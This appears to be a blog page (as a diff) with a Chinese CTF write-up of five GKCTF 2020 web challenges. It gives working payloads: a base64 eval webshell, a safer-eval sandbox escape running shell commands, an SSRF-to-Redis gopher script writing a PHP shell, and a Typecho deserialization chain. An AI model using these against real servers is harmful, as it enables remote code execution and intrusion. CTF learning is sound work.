@@ -1,0 +1,284 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>GKCTF - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="抽空把GKCTF的题目刷了，先从第一题开始说吧
+1.Check in说是一道签到题，但是得用到pwn的知识【虽然exp直接就能打了
+第一步访问就能审计到代码：
+1234567891011121314,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">GKCTF</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">GKCTF</h1>
+        <div class="stuff">
+            <span>十月 27, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>抽空把GKCTF的题目刷了，先从第一题开始说吧</p>
+<h1 id="1-Check-in"><a href="#1-Check-in" class="headerlink" title="1.Check in"></a>1.Check in</h1><p>说是一道签到题，但是得用到pwn的知识【虽然exp直接就能打了</p>
+<p>第一步访问就能审计到代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">&#x27;Ginkgo&#x27;</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>就是一个很简单的序列化，我们直接base64编码Ginkgo之后的值即可。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Ginkgo=cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>
+
+<p>审计到PHP的代码，下一步我们会发现自己蚁剑连接不上，没办法，只能自己再写一个shell了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Ginkgo=ZXZhbCgkX1BPU1Rbc2FrYW5pXSk7AA==</span><br></pre></td></tr></table></figure>
+
+<p>密码是sakani，之后就可以用蚁剑链接上去了，但是我们发现flag没法读啊。而且因为disable_function，我们 没有办法使用虚拟终端了。</p>
+<p>但是我们查看版本，版本为PHP7.3，可以尝试用内核漏洞提权，在tmp目录（777），上传exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/mm0r1/exploits</span></span><br></pre></td></tr></table></figure>
+
+<p>上传这里的gc漏洞，之后执行命令即可</p>
+<h1 id="2-老八小超市儿"><a href="#2-老八小超市儿" class="headerlink" title="2.老八小超市儿"></a>2.老八小超市儿</h1><p>根据这篇文章可以做出来前半段成功拿到shell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.nctry.com&#x2F;1660.html</span><br></pre></td></tr></table></figure>
+
+<p>这里我传入成功之后路径为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;d315d6f1-ec5d-40f2-9c4f-358445b37fba.node3.buuoj.cn&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;1.php</span><br></pre></td></tr></table></figure>
+
+<p>用蚁剑连入，根目录下找到flag却不能读，读atuo.sh可以知道它每分钟会执行一次makeflaghint.py，同时其权限是766，也就是说我们可以改~，那我们去改这个py的内容让他读flag即可，等一分钟，读到flag</p>
+<h1 id="3-EzNode"><a href="#3-EzNode" class="headerlink" title="3.EzNode"></a>3.EzNode</h1><p>就是一个很基础的代码审计：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2020.1/WORKER2 老板说为了后期方便优化</span></span><br><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.path === <span class="string">&#x27;/eval&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(delay);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Number</span>.isInteger(<span class="built_in">parseInt</span>(req.query.delay))) &#123;</span><br><span class="line">      delay = <span class="built_in">Math</span>.max(delay, <span class="built_in">parseInt</span>(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> next(), delay);</span><br><span class="line">    <span class="comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(t);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;timeout&#x27;</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.send(<span class="string">&#x27;Timeout!&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>注意核心代码在worker2到worker3之间，我们发现如果delay被设置成了60*1000</p>
+<p>而超时是1000.如果没有超时，反而会next，也就是会继续执行代码，否则直接弹回去超时，于是我们看下一步</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">&#x27;/eval&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> response = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = saferEval(req.body.e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      response = <span class="string">&#x27;Wrong Wrong Wrong!!!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.send(<span class="built_in">String</span>(response));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>下面使用了saferEval的代码，接收e的参数，于是我们的目标很清晰，首先尝试绕过对超时的限制，再搜一下saferEval的数据~，文档说到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parseInt(string, radix)</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">string</td>
+<td align="left">必需。要被解析的字符串。</td>
+</tr>
+<tr>
+<td align="left">radix</td>
+<td align="left">可选。表示要解析的数字的基数。该值介于 2 ~ 36 之间。如果省略该参数或其值为 0，则数字将以 10 为基础来解析。如果它以 “0x” 或 “0X” 开头，将以 16 为基数。如果该参数小于 2 或者大于 36，则 parseInt() 将返回 NaN。</td>
+</tr>
+</tbody></table>
+<p>这也就说明，如果传入delay是很大很大的数，也就不能被解析了，那我们的delay此时变成了1秒，也就绕过了超时限制，接下来我们就可以命令执行咯，尝试：</p>
+<p><img src="..%5Cimages%5Cimage-20201027214654296.png" alt="image-20201027214654296"></p>
+<p>发现此时就绕过了超时的限制了！，于是再构造执行EvalSafer的代码，查到是CVE-2019-10769</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;commenthol&#x2F;safer-eval&#x2F;issues&#x2F;10</span><br></pre></td></tr></table></figure>
+
+<p>payload如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> saferEval = <span class="built_in">require</span>(<span class="string">&quot;./src/index&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> theFunction = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> process = clearImmediate.constructor(<span class="string">&quot;return process;&quot;</span>)();</span><br><span class="line">  <span class="keyword">return</span> process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString()</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`(<span class="subst">$&#123;theFunction&#125;</span>)()`</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(saferEval(untrusted));</span><br></pre></td></tr></table></figure>
+
+<p>其中核心代码就是theFunction，我们传入进去污染参数即可执行代码</p>
+<p><img src="..%5Cimages%5Cimage-20201028121332238.png" alt="image-20201028121332238"></p>
+<h1 id="4-EzWeb"><a href="#4-EzWeb" class="headerlink" title="4.EzWeb"></a>4.EzWeb</h1><p>是一个redis的题目..没有做过这样的，硬着头皮做吧，访问之后根据提示访问 ?secret</p>
+<p><img src="..%5Cimages%5Cimage-20201028124819584.png" alt="image-20201028124819584"></p>
+<p>查询了一些，这是内网的环境，也就是说虽然题目过滤了127.0.0.1,但是我们可以测试其他靶机的内容</p>
+<p><img src="..%5Cimages%5Cimage-20201028125140003.png" alt="image-20201028125140003"></p>
+<p>访问过去之后好像也不是啥玩意儿啊,尝试用file协议的漏洞读到了index.php的源码：</p>
+<p>file:[空格]/</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;file:%20&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&amp;submit&#x3D;提交</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?secret--&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">		$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">		<span class="comment">//echo $url.&quot;\n&quot;;</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;</span>, $url,$match))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//var_dump($match);</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;别这样&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		curl($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">	system(<span class="string">&#x27;ifconfig&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们发现过滤了dict协议，file协议，但是没有过滤http协议和gopher协议，我们猜想出题人想让我们利用http协议进行内网探测，gopher协议进行攻击,果然，在11端口上找到了变化</p>
+<p><img src="F:\MyGitBlog\source\images\image-20201028132212757.png" alt="image-20201028132212757"></p>
+<p>让我们尝试服务，因为ssrf常用的几个服务就是mysql和redis，于是分别访问3306端口和6379端口</p>
+<p>6379上得到：</p>
+<p><img src="..%5Cimages%5Cimage-20201028132532651.png" alt="image-20201028132532651"></p>
+<p>发现果然有ERR端口，于是尝试用gopher协议打一波，这里直接用了一波别人的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.96.119.11&quot;</span>      // 运行有redis的主机ip</span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	 <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	 <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">	 <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">	 <span class="string">&quot;save&quot;</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">	CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">	cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	<span class="built_in">print</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们改一下主机IP为:10.160.187.11</p>
+<p>得到payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;10.160.187.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20&#x2F;flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure>
+
+<h1 id="5-EZ三剑客-EzTypecho"><a href="#5-EZ三剑客-EzTypecho" class="headerlink" title="5.EZ三剑客-EzTypecho"></a>5.EZ三剑客-EzTypecho</h1><p>这道题目，呃，原理比较难，但是利用起来却很简单，比如在这篇文章中可以找到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;155753.html</span><br></pre></td></tr></table></figure>
+
+<p>exp就可以找到了，在做题的时候直接在finish时会发现无法利用的情况</p>
+<p><img src="..%5Cimages%5Cimage-20201028171811386.png" alt="image-20201028171811386"></p>
+<p>这个时候就必须看源码了</p>
+<p>查找session，在源码中可以找到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> <span class="keyword">else</span> : <span class="meta">?&gt;</span></span><br><span class="line">               <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) &#123; <span class="keyword">die</span>(<span class="string">&#x27;no, you can\&#x27;t unserialize it without session QAQ&#x27;</span>);&#125;</span><br><span class="line">               $config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">&#x27;__typecho_config&#x27;</span>)));</span><br><span class="line">               Typecho_Cookie::delete(<span class="string">&#x27;__typecho_config&#x27;</span>);</span><br><span class="line">               $db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">&#x27;adapter&#x27;</span>], $config[<span class="string">&#x27;prefix&#x27;</span>]);</span><br><span class="line">               $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">               Typecho_Db::set($db);</span><br><span class="line">               <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们去查找sesion在哪里赋值：</p>
+<p><img src="..%5Cimages%5Cimage-20201028172113525.png" alt="image-20201028172113525"></p>
+<p>结果发现一旦在这里就被exit停下来了，于是查找start，结果发现源码当中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                        $config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">&#x27;__typecho_config&#x27;</span>)));</span><br><span class="line">                        $type = explode(<span class="string">&#x27;_&#x27;</span>, $config[<span class="string">&#x27;adapter&#x27;</span>]);</span><br><span class="line">                        $type = array_pop($type);</span><br></pre></td></tr></table></figure>
+
+<p>发现它居然接收一个参数…那这样的话我们用这个去打就行了，利用脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_type;</span><br><span class="line">    <span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="string">&quot;RSS 2.0&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;title&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">                <span class="string">&quot;link&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">                <span class="string">&quot;data&quot;</span> =&gt; <span class="string">&quot;20190430&quot;</span>,</span><br><span class="line">                <span class="string">&quot;author&quot;</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">            ),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;screenName&quot;</span> =&gt; <span class="string">&quot;eval(&#x27;echo `cat /flag`;exit();&#x27;)&quot;</span>,</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>(<span class="string">&quot;assert&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;adapter&quot;</span> =&gt; $a,</span><br><span class="line">    <span class="string">&quot;prefix&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($c));</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag：</p>
+<p><img src="..%5Cimages%5Cimage-20201028172325171.png" alt="image-20201028172325171"></p>
+<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>​    题目虽然原理都很难，但是利用却很简单，自己先把题目成功的复现接出来了，以后再逐步复现原理把。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
